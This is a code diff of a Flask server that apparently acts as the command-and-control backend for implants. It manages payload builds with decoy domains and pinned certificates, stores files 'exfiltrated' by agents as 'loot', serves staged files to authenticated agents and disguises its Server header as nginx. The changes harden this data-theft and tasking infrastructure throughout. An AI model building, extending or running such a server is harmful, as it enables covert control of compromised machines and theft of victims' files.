                 "cert_pin": b["cert_pin"],
+                "transport_mode": b["transport_mode"] or "http",
+                "decoy_domain": b["decoy_domain"],
                 "created_at": b["created_at"],
             }
             for b in builds
@@ -1229,26 +1872,99 @@ def download_build(build_id):
 def delete_build(build_id):
     """Delete a build and its file."""
     conn = get_db_connection()
-    build = conn.execute("SELECT * FROM builds WHERE id = ?", (build_id,)).fetchone()
+    try:
+        # Serialize reference checks with writes even on migrated databases
+        # that cannot enforce the new foreign key.
+        conn.execute("BEGIN IMMEDIATE")
+        build = conn.execute("SELECT * FROM builds WHERE id = ?", (build_id,)).fetchone()
+        if not build:
+            return jsonify({"error": "Build not found"}), 404
 
-    if not build:
+        # Apply the same policy to fresh databases (with a foreign key) and
+        # migrated databases (whose added build_id column lacks that key).
+        linked = conn.execute(
+            "SELECT 1 FROM agents WHERE build_id = ? OR "
+            "((build_id IS NULL OR build_id = 0) AND key_id = ?) LIMIT 1",
+            (build_id, build["key_id"]),
+        ).fetchone()
+        if linked:
+            return jsonify({"error": "Build is referenced by registered agents"}), 409
+
+        # Record the cleanup in the same transaction as the row deletion.
+        # A crash or unlink failure after commit can then be retried safely.
+        file_path = build["file_path"]
+        if not _is_managed_build_artifact(file_path):
+            return jsonify({"error": "Build artifact is outside the managed directory"}), 500
+        shared = conn.execute(
+            "SELECT 1 FROM builds WHERE file_path = ? AND id != ? LIMIT 1",
+            (file_path, build_id),
+        ).fetchone()
+        if shared:
+            return jsonify({"error": "Build artifact is referenced by another build"}), 409
+        cleanup_id = conn.execute(
+            "INSERT INTO build_cleanup_queue (file_path) VALUES (?)", (file_path,)
+        ).lastrowid
+        conn.execute("DELETE FROM builds WHERE id = ?", (build_id,))
+        conn.execute(
+            "DELETE FROM seen_nonces WHERE kid = ? AND NOT EXISTS "
+            "(SELECT 1 FROM builds WHERE key_id = ?)",
+            (build["key_id"], build["key_id"]),
+        )
+        conn.commit()
+        if not _remove_queued_build_artifact(conn, cleanup_id, file_path):
+            return jsonify({"error": "Build record deleted; artifact cleanup queued for retry on restart"}), 500
+        return jsonify({"status": "ok"})
+    except sqlite3.IntegrityError:
+        conn.rollback()
+        return jsonify({"error": "Build is referenced by registered agents"}), 409
+    finally:
         conn.close()
-        return jsonify({"error": "Build not found"}), 404
 
-    # Delete file from disk
-    file_path = build["file_path"]
-    if os.path.exists(file_path):
+
+def _is_managed_build_artifact(file_path):
+    if not isinstance(file_path, str) or not os.path.isabs(file_path):
+        return False
+    managed_dir = os.path.realpath(BUILDS_DIR)
+    return (os.path.dirname(os.path.realpath(file_path)) == managed_dir and
+            not os.path.islink(file_path))
+
+
+def _remove_queued_build_artifact(conn, cleanup_id, file_path):
+    """Remove one committed build artifact without following paths outside BUILDS_DIR."""
+    if not _is_managed_build_artifact(file_path):
+        app.logger.error("Refusing build cleanup outside managed directory: %s", file_path)
+        return False
+    if conn.execute("SELECT 1 FROM builds WHERE file_path = ? LIMIT 1", (file_path,)).fetchone():
+        app.logger.error("Refusing build cleanup for an artifact still referenced by a build")
+        return False
+    try:
         os.remove(file_path)
-
-    # Delete from database
-    conn.execute("DELETE FROM builds WHERE id = ?", (build_id,))
+    except FileNotFoundError:
+        pass  # A previous attempt removed it before losing the queue acknowledgement.
+    except OSError:
+        app.logger.exception("Could not remove queued build artifact: %s", file_path)
+        return False
+    conn.execute("DELETE FROM build_cleanup_queue WHERE id = ?", (cleanup_id,))
     conn.commit()
-    conn.close()
-
-    return jsonify({"status": "ok"})
+    return True
 
 
-# -- upload / exfil (agent -> server) --
+def retry_queued_build_cleanup():
+    """Retry committed artifact deletions left by a crash or filesystem error."""
+    conn = get_db_connection()
+    try:
+        rows = conn.execute("SELECT id, file_path FROM build_cleanup_queue ORDER BY id").fetchall()
+        for row in rows:
+            try:
+                _remove_queued_build_artifact(conn, row["id"], row["file_path"])
+            except sqlite3.Error:
+                app.logger.exception("Could not acknowledge build cleanup %s", row["id"])
+                conn.rollback()
+    finally:
+        conn.close()
+
+
+# Agent uploads.
 
 def receive_upload():
     """Receive an exfiltrated file from an agent."""
@@ -1266,27 +1982,31 @@ def receive_upload():
     except (ValueError, KeyError, TypeError):
         return jsonify({"error": "Invalid auth"}), 400
 
-    key_hex = _get_key_for_kid(kid)
-    if key_hex is None:
-        return jsonify({"error": "Unknown key"}), 403
-
     try:
         nonce_hex = base64.b64decode(data)[:12].hex()
     except Exception:
         return jsonify({"error": "Invalid payload"}), 400
 
-    try:
-        plaintext = decrypt_payload(key_hex, data)
-        meta = json.loads(plaintext)
-    except Exception:
+    meta, key_hex, _ = _decrypt_with_kid(kid, data)
+    if meta is None or key_hex is None:
+        candidate_builds = _get_builds_for_kid(kid)
+        if not candidate_builds:
+            return jsonify({"error": "Unknown key"}), 403
         return jsonify({"error": "Decryption failed"}), 403
+
+    if not isinstance(meta, dict):
+        return jsonify({"error": "Invalid upload identity"}), 400
+    conn = get_db_connection()
+    if not _agent_authenticated(conn, meta.get("agent_id"), meta.get("agent_secret"), kid):
+        conn.close()
+        return jsonify({"error": "Invalid agent identity"}), 403
 
     file_data = file.read()
     if hashlib.sha256(file_data).hexdigest() != meta.get("sha256"):
+        conn.close()
         return jsonify({"error": "Integrity check failed"}), 400
 
     # nonce INSERT shares conn with loot INSERT so both commit atomically
-    conn = get_db_connection()
     try:
         conn.execute(
             "INSERT INTO seen_nonces (kid, nonce) VALUES (?, ?)",
@@ -1300,12 +2020,32 @@ def receive_upload():
     original_path = request.form.get("original_path", "")
     filename = secure_filename(file.filename) if file.filename else "unnamed"
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    save_name = f"{timestamp}_{filename}"
+    # Random suffix prevents same-second collisions between uploads with
+    # the same sanitized filename.
+    random_suffix = os.urandom(4).hex()
+    save_name = f"{timestamp}_{random_suffix}_{filename}"
     save_path = os.path.join(LOOT_DIR, save_name)
 
+    file_created = False
     try:
-        with open(save_path, "wb") as f:
-            f.write(file_data)
+        # O_CREAT|O_EXCL guarantees we never silently overwrite another
+        # upload's file, even on a freak random-suffix collision.
+        fd = os.open(save_path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
+        file_created = True
+        try:
+            total_written = 0
+            data_view = memoryview(file_data)
+            while total_written < len(file_data):
+                n = os.write(fd, data_view[total_written:])
+                if n <= 0:
+                    raise OSError(f"Short write: wrote 0 bytes at offset {total_written}/{len(file_data)}")
+                total_written += n
+            if total_written != len(file_data):
+                raise OSError(f"Short write: wrote {total_written} of {len(file_data)} bytes")
+            os.fsync(fd)
+        finally:
+            os.close(fd)
+
         conn.execute(
             "INSERT INTO loot (agent_id, filename, original_path, file_path, file_size) VALUES (?, ?, ?, ?, ?)",
             (agent_id, filename, original_path, save_path, len(file_data)),
@@ -1313,8 +2053,12 @@ def receive_upload():
         conn.commit()
         return jsonify({"status": "ok", "filename": filename, "size": len(file_data)})
     except Exception:
-        if os.path.exists(save_path):
-            os.remove(save_path)
+        # Only remove the file if *this* attempt created it.
+        if file_created and os.path.exists(save_path):
+            try:
+                os.remove(save_path)
+            except OSError:
+                pass
         raise
     finally:
         conn.close()
@@ -1361,25 +2105,87 @@ def download_loot(loot_id):
 
 @app.route("/api/loot/<int:loot_id>", methods=["DELETE"])
 def delete_loot(loot_id):
-    """Delete an exfiltrated file."""
-    conn = get_db_connection()
-    item = conn.execute("SELECT * FROM loot WHERE id = ?", (loot_id,)).fetchone()
+    """Delete a loot record, then remove its file through a durable queue."""
+    return _delete_managed_file_record("loot", loot_id)
 
-    if not item:
-        conn.close()
-        return jsonify({"error": "Loot not found"}), 404
 
-    if os.path.exists(item["file_path"]):
-        os.remove(item["file_path"])
+def _managed_file_path(kind, file_path):
+    directory = LOOT_DIR if kind == "loot" else STAGED_DIR
+    return (isinstance(file_path, str) and os.path.isabs(file_path) and
+            os.path.dirname(os.path.realpath(file_path)) == os.path.realpath(directory) and
+            not os.path.islink(file_path))
 
-    conn.execute("DELETE FROM loot WHERE id = ?", (loot_id,))
+
+def _remove_queued_file(conn, cleanup_id, kind, file_path):
+    if not _managed_file_path(kind, file_path):
+        app.logger.error("Refusing file cleanup outside managed directory: %s", file_path)
+        return False
+    if (conn.execute("SELECT 1 FROM loot WHERE file_path = ? LIMIT 1", (file_path,)).fetchone() or
+            conn.execute("SELECT 1 FROM staged_files WHERE file_path = ? LIMIT 1", (file_path,)).fetchone()):
+        app.logger.error("Refusing file cleanup for a path still referenced by a record")
+        return False
+    try:
+        os.remove(file_path)
+    except FileNotFoundError:
+        pass
+    except OSError:
+        app.logger.exception("Could not remove queued file: %s", file_path)
+        return False
+    conn.execute("DELETE FROM file_cleanup_queue WHERE id = ?", (cleanup_id,))
     conn.commit()
-    conn.close()
-
-    return jsonify({"status": "ok"})
+    return True
 
 
-# -- file staging (server -> agent) --
+def _delete_managed_file_record(kind, record_id):
+    table = "loot" if kind == "loot" else "staged_files"
+    label = "Loot" if kind == "loot" else "File"
+    conn = get_db_connection()
+    try:
+        conn.execute("BEGIN IMMEDIATE")
+        item = conn.execute(f"SELECT file_path FROM {table} WHERE id = ?", (record_id,)).fetchone()
+        if not item:
+            return jsonify({"error": f"{label} not found"}), 404
+        file_path = item["file_path"]
+        if not _managed_file_path(kind, file_path):
+            return jsonify({"error": "File is outside the managed directory"}), 500
+        if (conn.execute("SELECT 1 FROM loot WHERE file_path = ? AND (? != 'loot' OR id != ?) LIMIT 1",
+                         (file_path, kind, record_id)).fetchone() or
+                conn.execute("SELECT 1 FROM staged_files WHERE file_path = ? AND (? != 'staged' OR id != ?) LIMIT 1",
+                             (file_path, kind, record_id)).fetchone()):
+            return jsonify({"error": "File is referenced by another record"}), 409
+        cleanup_id = conn.execute(
+            "INSERT INTO file_cleanup_queue (kind, file_path) VALUES (?, ?)",
+            (kind, file_path),
+        ).lastrowid
+        conn.execute(f"DELETE FROM {table} WHERE id = ?", (record_id,))
+        conn.commit()
+        if not _remove_queued_file(conn, cleanup_id, kind, file_path):
+            return jsonify({"error": "Record deleted; file cleanup queued for retry on restart"}), 500
+        return jsonify({"status": "ok"})
+    except sqlite3.Error:
+        conn.rollback()
+        app.logger.exception("Could not delete %s record %s", kind, record_id)
+        return jsonify({"error": f"Could not delete {label.lower()} record"}), 500
+    finally:
+        conn.close()
+
+
+def retry_queued_file_cleanup():
+    """Retry file removals committed with deleted loot/staged records."""
+    conn = get_db_connection()
+    try:
+        rows = conn.execute("SELECT id, kind, file_path FROM file_cleanup_queue ORDER BY id").fetchall()
+        for row in rows:
+            try:
+                _remove_queued_file(conn, row["id"], row["kind"], row["file_path"])
+            except sqlite3.Error:
+                app.logger.exception("Could not acknowledge file cleanup %s", row["id"])
+                conn.rollback()
+    finally:
+        conn.close()
+
+
+# Files staged for agents.
 
 @app.route("/api/files/stage", methods=["POST"])
 def stage_file():
@@ -1389,28 +2195,87 @@ def stage_file():
 
     file = request.files["file"]
     filename = secure_filename(file.filename) if file.filename else "unnamed"
-    save_path = os.path.join(STAGED_DIR, filename)
+    file_data = file.read()
+    name, ext = os.path.splitext(filename)
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
 
-    # Avoid overwrites
-    if os.path.exists(save_path):
-        name, ext = os.path.splitext(filename)
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        filename = f"{name}_{timestamp}{ext}"
-        save_path = os.path.join(STAGED_DIR, filename)
+    # Try original name, then timestamp fallback, then random-suffix fallbacks.
+    # Exclusive creation (O_CREAT|O_EXCL) guarantees we never silently overwrite
+    # a pre-existing candidate path or another concurrent upload.
+    candidates = [
+        filename,
+        f"{name}_{timestamp}{ext}",
+    ]
+    fd = -1
+    save_name = None
+    save_path = None
+    file_created = False
 
-    file.save(save_path)
-    file_size = os.path.getsize(save_path)
+    for cand in candidates:
+        cand_path = os.path.join(STAGED_DIR, cand)
+        try:
+            fd = os.open(cand_path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
+            save_name = cand
+            save_path = cand_path
+            file_created = True
+            break
+        except FileExistsError:
+            continue
+        except OSError:
+            raise
 
-    conn = get_db_connection()
-    cursor = conn.execute(
-        "INSERT INTO staged_files (filename, file_path, file_size) VALUES (?, ?, ?)",
-        (filename, save_path, file_size),
-    )
-    file_id = cursor.lastrowid
-    conn.commit()
-    conn.close()
+    if fd == -1:
+        # Both original and candidate timestamp paths exist; use random suffix.
+        for _ in range(100):
+            rand = os.urandom(4).hex()
+            cand = f"{name}_{timestamp}_{rand}{ext}"
+            cand_path = os.path.join(STAGED_DIR, cand)
+            try:
+                fd = os.open(cand_path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
+                save_name = cand
+                save_path = cand_path
+                file_created = True
+                break
+            except FileExistsError:
+                continue
+        if fd == -1:
+            return jsonify({"error": "Failed to allocate unique staged file path"}), 500
 
-    return jsonify({"status": "ok", "file_id": file_id, "filename": filename, "file_size": file_size})
+    try:
+        try:
+            total_written = 0
+            data_view = memoryview(file_data)
+            while total_written < len(file_data):
+                n = os.write(fd, data_view[total_written:])
+                if n <= 0:
+                    raise OSError(f"Short write: wrote 0 bytes at offset {total_written}/{len(file_data)}")
+                total_written += n
+            if total_written != len(file_data):
+                raise OSError(f"Short write: wrote {total_written} of {len(file_data)} bytes")
+            os.fsync(fd)
+        finally:
+            os.close(fd)
+
+        file_size = len(file_data)
+        conn = get_db_connection()
+        try:
+            cursor = conn.execute(
+                "INSERT INTO staged_files (filename, file_path, file_size) VALUES (?, ?, ?)",
+                (save_name, save_path, file_size),
+            )
+            file_id = cursor.lastrowid
+            conn.commit()
+        finally:
+            conn.close()
+
+        return jsonify({"status": "ok", "file_id": file_id, "filename": save_name, "file_size": file_size})
+    except Exception:
+        if file_created and save_path and os.path.exists(save_path):
+            try:
+                os.remove(save_path)
+            except OSError:
+                pass
+        raise
 
 
 @app.route("/api/files", methods=["GET"])
@@ -1434,8 +2299,33 @@ def get_staged_files():
 
 
 def serve_staged_file(file_id):
-    """Agent fetches a staged file by ID."""
+    """Serve a staged file only for an authenticated agent's sent download task."""
+    agent_id = request.headers.get("X-Agent-ID", "")
+    auth = request.headers.get("Authorization", "")
+    task_id_raw = request.headers.get("X-Task-ID", "")
+    if not auth.startswith("Bearer ") or not task_id_raw.isdecimal() or len(task_id_raw) > 19:
+        return jsonify({"error": "Agent authentication required"}), 401
+    task_id = int(task_id_raw)
+    if task_id > 9223372036854775807:
+        return jsonify({"error": "Invalid task ID"}), 400
+
     conn = get_db_connection()
+    if not _agent_authenticated(conn, agent_id, auth[7:]):
+        conn.close()
+        return jsonify({"error": "Invalid agent identity"}), 401
+
+    task = conn.execute(
+        "SELECT command, status FROM tasks WHERE id = ? AND agent_id = ?",
+        (task_id, agent_id),
+    ).fetchone()
+    parts = task["command"].split(maxsplit=2) if task else []
+    if (
+        not task or task["status"] != "sent" or len(parts) != 3 or
+        parts[0] != "download" or not parts[1].isdecimal() or int(parts[1]) != file_id
+    ):
+        conn.close()
+        return jsonify({"error": "File not assigned to agent"}), 403
+
     f = conn.execute("SELECT * FROM staged_files WHERE id = ?", (file_id,)).fetchone()
     conn.close()
 
@@ -1446,30 +2336,18 @@ def serve_staged_file(file_id):
     if not os.path.exists(file_path):
         return jsonify({"error": "File not found on disk"}), 404
 
-    return send_file(file_path, as_attachment=True, download_name=f["filename"])
+    response = send_file(file_path, as_attachment=True, download_name=f["filename"])
+    response.headers["Cache-Control"] = "private, no-store"
+    return response
 
 
 @app.route("/api/files/<int:file_id>", methods=["DELETE"])
 def delete_staged_file(file_id):
-    """Delete a staged file."""
-    conn = get_db_connection()
-    f = conn.execute("SELECT * FROM staged_files WHERE id = ?", (file_id,)).fetchone()
-
-    if not f:
-        conn.close()
-        return jsonify({"error": "File not found"}), 404
-
-    if os.path.exists(f["file_path"]):
-        os.remove(f["file_path"])
-
-    conn.execute("DELETE FROM staged_files WHERE id = ?", (file_id,))
-    conn.commit()
-    conn.close()
-
-    return jsonify({"status": "ok"})
+    """Delete a staged record, then remove its file through a durable queue."""
+    return _delete_managed_file_record("staged", file_id)
 
 
-# -- agent route registration --
+# Agent route registration.
 
 def _register_agent_routes():
     """
@@ -1490,21 +2368,26 @@ def _register_agent_routes():
 
 _register_agent_routes()
 
+retry_queued_build_cleanup()
+retry_queued_file_cleanup()
+purge_destroyed_agents()
 
-# -- nonce cleanup --
+
+# Periodic cleanup.
 
 def _nonce_cleanup_loop():
     while True:
         time.sleep(3600)
         try:
-            purge_old_nonces(days=7)
+            purge_retired_build_nonces()
+            purge_destroyed_agents()
         except Exception:
             pass
 
 threading.Thread(target=_nonce_cleanup_loop, daemon=True, name="nonce-cleanup").start()
 
 
-# -- entry point --
+# Development server entry point.
 
 if __name__ == "__main__":
     # Werkzeug writes its own Server header at the socket level before our
@@ -1513,9 +2396,7 @@ if __name__ == "__main__":
     setattr(WSGIRequestHandler, "server_version", "nginx/1.24.0")
     setattr(WSGIRequestHandler, "sys_version", "")
 
-    # Check for TLS certificate
-    _cert_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs", "server.crt")
-    _key_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs", "server.key")
+    _cert_path, _key_path = _active_tls_paths()
 
     if os.path.exists(_cert_path) and os.path.exists(_key_path):
         _ssl_ctx = (_cert_path, _key_path)
